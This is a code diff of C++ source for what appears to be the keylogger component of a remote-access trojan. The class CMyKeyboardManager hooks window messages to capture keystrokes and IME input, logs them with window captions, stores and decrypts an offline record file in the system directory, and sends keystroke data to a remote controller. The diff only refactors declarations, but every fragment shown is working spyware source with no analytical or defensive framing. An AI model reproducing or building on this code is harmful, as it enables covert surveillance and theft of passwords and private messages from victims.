@@ -128,7 +128,7 @@ void CMyKeyboardManager::SaveInfo(char *lpBuffer)
 			SysTime.wMonth, SysTime.wDay, SysTime.wYear,
 			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
 			strCapText
-			);
+		);
 
 		OutputDebugStringA(strSaveString);
 		// 让函认为是应该保存的
@@ -152,7 +152,6 @@ void CMyKeyboardManager::SaveInfo(char *lpBuffer)
 
 LRESULT CALLBACK CMyKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	MSG*	pMsg;
 	char	strChar[2];
 	char	KeyName[20];
 
@@ -169,7 +168,7 @@ LRESULT CALLBACK CMyKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM
 
 	LRESULT result = CallNextHookEx(m_pTShared->hGetMsgHook, nCode, wParam, lParam);
 
-	pMsg = (MSG*)(lParam);
+	MSG* pMsg = (MSG*)(lParam);
 	// 防止消息重复产生记录重复，以pMsg->time判断
 	if (
 		(nCode != HC_ACTION) ||
@@ -191,7 +190,7 @@ LRESULT CALLBACK CMyKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM
 		// 考虑到UNICODE
 		strLen += sizeof(WCHAR);
 		ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
-		strLen = myImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
+		myImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
 		//		strLen =myNetReads(hImc, GCS_RESULTSTR, NULL, 0);
 
 		//		myNetRead1(hWnd, hImc);
@@ -282,7 +281,6 @@ bool CMyKeyboardManager::StartHook()
 int CMyKeyboardManager::sendOfflineRecord()
 {
 	int		nRet = 0;
-	DWORD	dwSize = 0;
 	DWORD	dwBytesRead = 0;
 	TCHAR	strRecordFile[MAX_PATH];
 	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
@@ -293,7 +291,7 @@ int CMyKeyboardManager::sendOfflineRecord()
 
 	if (hFile != INVALID_HANDLE_VALUE)
 	{
-		dwSize = GetFileSize(hFile, NULL);
+		DWORD dwSize = GetFileSize(hFile, NULL);
 		char *lpBuffer = new char[dwSize];
 		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
 		// 解密
@@ -331,14 +329,13 @@ int CMyKeyboardManager::sendStartKeyBoard()
 
 int CMyKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
 {
-	int nRet = -1;
-	DWORD	dwBytesLength = 1 + nSize;
-	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
+	DWORD dwBytesLength = 1 + nSize;
+	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
 	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
 	memcpy(lpBuffer + 1, lpData, nSize);
 
 	OutputDebugStringA((char*)lpBuffer);
-	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
+	int nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
 	LocalFree(lpBuffer);
 	return nRet;
 }
